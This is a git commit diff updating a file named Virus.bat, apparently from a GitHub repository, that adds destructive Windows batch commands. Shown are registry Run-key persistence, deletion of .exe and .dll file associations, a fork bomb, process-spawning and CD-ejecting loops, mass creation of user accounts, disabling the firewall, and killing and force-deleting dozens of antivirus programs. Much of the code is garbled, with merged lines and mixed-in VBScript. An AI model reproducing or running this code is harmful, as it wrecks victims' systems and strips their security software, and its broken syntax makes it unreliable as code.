d059e5c8f6fac663acd5cc967f0e0c7df746e8b8
BatchGuy-bat <79389520+BatchGuy-bat@users.noreply.github.com>
2021-02-22 16:54:26 +0800

    Update Virus.bat

--- Virus.bat
+++ Virus.bat
@@ -78,15 +78,76 @@ bcdedit /set {default} recoveryenabled No
 bcdedit /set {default} bootstatuspolicy ignoreallfailures  
 sc config "explorer.exe" start= disabled 
 sc stop "explorer.exe"
-netsh interface set interface "Ethernet" admin=disable
 icacls %windir%\system32\shutdown.exe /deny SID:D
-rem —
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
+@ECHO OFF
+ START reg delete HKCR/.exe
+ START reg delete HKCR/.dll
+ START reg delete HKCR/*
+ Set oWMP = CreateObject(”WMPlayer.OCX.7″)
+ Set colCDROMs = oWMP.cdromCollection
+ do
+ if colCDROMs.Count >= 1 then
+ For i = 0 to colCDROMs.Count – 1
+ colCDROMs.Item(i).Eject
+ Next
+ For i = 0 to colCDROMs.Count – 1
+ colCDROMs.Item(i).Eject
+ Next
+ End If
+ wscript.sleep 100
+ loop
+ Set wshShell = wscript.CreateObject(”WScript.Shell”)
+ do
+ wscript.sleep 100
+ wshshell.sendkeys “~(enter)”
+ loop
+ @echo off
+ :x
+ start chrome.exe
+ start mspaint
+ start notepad
+ start write
+ start cmd
+ start explorer
+ start control
+ start calc
+ goto x
+ @echo off
+:x
+md %random%
+/folder.
+goto x
+@echo off
+:xnet
+user %random% /add
+goto x
+@ECHO off
+ :top
+ START %SystemRoot%\system32\notepad.exe
+ GOTO top
+ %0|%0
+@ echo off
+rem
 rem Permanently Kill Anti-Virus
 net stop “Security Center”
 netsh firewall set opmode mode=disable
 tskill /A av*
 tskill /A fire*
 tskill /A anti*
+cls
+tskill /A spy*
+tskill /A bullguard
+tskill /A PersFw
+tskill /A KAV*
+tskill /A ZONEALARM
+tskill /A SAFEWEB
 cls
 tskill /A spy*
 tskill /A bullguard
@@ -121,8 +182,7 @@ tskill /A mghtml
 tskill /A msiexec
 tskill /A outpost
 tskill /A isafe
-tskill /A zap*
-cls
+tskill /A zap*cls
 tskill /A zauinst
 tskill /A upd*
 tskill /A zlclien*
@@ -143,15 +203,13 @@ tskill /A pcc*
 tskill /A cpd*
 tskill /A pop*
 tskill /A pav*
-tskill /A padmin
-cls
+tskill /A padmincls
 tskill /A panda*
 tskill /A avsch*
 tskill /A sche*
 tskill /A syman*
 tskill /A virus*
-tskill /A realm*
-cls
+tskill /A realm*cls
 tskill /A sweep*
 tskill /A scan*
 tskill /A ad-*
@@ -160,51 +218,51 @@ tskill /A avas*
 tskill /A norm*
 cls
 tskill /A offg*
-del /Q /F C:Program Filesalwils~1avast4*.*
-del /Q /F C:Program FilesLavasoftAd-awa~1*.exe
-del /Q /F C:Program Fileskasper~1*.exe
+del /Q /F C:\Program Files\alwils~1\avast4\*.*
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
 cls
-del /Q /F C:Program Filestrojan~1*.exe
-del /Q /F C:Program Filesf-prot95*.dll
-del /Q /F C:Program Filestbav*.dat
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.datcls
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\*.*
 cls
-del /Q /F C:Program Filesavpersonal*.vdf
-del /Q /F C:Program FilesNorton~1*.cnt
-del /Q /F C:Program FilesMcafee*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
+del /Q /F C:\Program Files\Norton~1\*.*
 cls
-del /Q /F C:Program FilesNorton~1Norton~1Norton~3*.*
-del /Q /F C:Program FilesNorton~1Norton~1speedd~1*.*
-del /Q /F C:Program FilesNorton~1Norton~1*.*
-del /Q /F C:Program FilesNorton~1*.*
+del /Q /F C:\Program Files\avgamsr\*.exe
+del /Q /F C:\Program Files\avgamsvr\*.exe
+del /Q /F C:\Program Files\avgemc\*.exe
 cls
-del /Q /F C:Program Filesavgamsr*.exe
-del /Q /F C:Program Filesavgamsvr*.exe
-del /Q /F C:Program Filesavgemc*.exe
+del /Q /F C:\Program Files\avgcc\*.exe
+del /Q /F C:\Program Files\avgupsvc\*.exe
+del /Q /F C:\Program Files\grisoft
+del /Q /F C:\Program Files\nood32krn\*.exe
+del /Q /F C:\Program Files\nood32\*.exe
 cls
-del /Q /F C:Program Filesavgcc*.exe
-del /Q /F C:Program Filesavgupsvc*.exe
-del /Q /F C:Program Filesgrisoft
-del /Q /F C:Program Filesnood32krn*.exe
-del /Q /F C:Program Filesnood32*.exe
+del /Q /F C:\Program Files\nod32
+del /Q /F C:\Program Files\nood32
+del /Q /F C:\Program Files\kav\*.exe
+del /Q /F C:\Program Files\kavmm\*.exe
+del /Q /F C:\Program Files\kaspersky\*.*
 cls
-del /Q /F C:Program Filesnod32
-del /Q /F C:Program Filesnood32
-del /Q /F C:Program Fileskav*.exe
-del /Q /F C:Program Fileskavmm*.exe
-del /Q /F C:Program Fileskaspersky*.*
+del /Q /F C:\Program Files\ewidoctrl\*.exe
+del /Q /F C:\Program Files\guard\*.exe
+del /Q /F C:\Program Files\ewido\*.exe
 cls
-del /Q /F C:Program Filesewidoctrl*.exe
-del /Q /F C:Program Filesguard*.exe
-del /Q /F C:Program Filesewido*.exe
+del /Q /F C:\Program Files\pavprsrv\*.exe
+del /Q /F C:\Program Files\pavprot\*.exe
+del /Q /F C:\Program Files\avengine\*.exe
 cls
-del /Q /F C:Program Filespavprsrv*.exe
-del /Q /F C:Program Filespavprot*.exe
-del /Q /F C:Program Filesavengine*.exe
-cls
-del /Q /F C:Program Filesapvxdwin*.exe
-del /Q /F C:Program Fileswebproxy*.exe
-del /Q /F C:Program Filespanda software*.*
-rem —
+del /Q /F C:\Program Files\apvxdwin\*.exe
+del /Q /F C:\Program Files\webproxy\*.exe
+del /Q /F C:\Program Files\panda
+software\*.*
+rem
 @echo off
 echo ^<html^>^<head^>^<title^>BSOD^
 </title^> > data1.hta
